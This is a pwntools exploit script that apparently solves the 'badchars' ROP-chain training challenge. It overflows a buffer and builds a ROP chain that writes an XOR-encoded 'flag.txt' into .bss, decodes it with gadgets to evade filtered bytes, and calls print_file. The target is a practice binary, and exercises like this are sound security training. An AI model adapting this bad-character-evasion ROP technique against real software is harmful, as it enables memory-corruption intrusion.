from pwn import *


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


def xor_data(offset, xor_key):
    payload = [pop_r14_r15, 0x69, offset, xor_r15_r14b]

    return payload


gdbscript = """
init-pwndbg
b *pwnme+268
continue
""".format(**locals())

exe = "./badchars"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"
context.terminal = "kitty"

io = start()
offset = 40

pop_r12_r13_r14_r15 = 0x000000000040069C
pop_r14_r15 = 0x00000000004006A0
mov_r13_r12 = 0x0000000000400634
xor_r15_r14b = 0x0000000000400628
pop_rdi = 0x00000000004006A3

bss = elf.bss()

rop_payload = [
    pop_r12_r13_r14_r15,
    b"\x0f\x05\x08\x0eG\x1d\x11\x1d",
    bss,
    0x69,
    bss,
    mov_r13_r12,
    xor_r15_r14b,
]

rop_payload += xor_data(bss + 1, 0x69)
rop_payload += xor_data(bss + 2, 0x69)
rop_payload += xor_data(bss + 3, 0x69)
rop_payload += xor_data(bss + 4, 0x69)
rop_payload += xor_data(bss + 5, 0x69)
rop_payload += xor_data(bss + 6, 0x69)
rop_payload += xor_data(bss + 7, 0x69)
rop_payload += [pop_rdi, bss, elf.sym["print_file"]]

payload = flat({offset: rop_payload})

io.sendline(payload)

io.interactive()
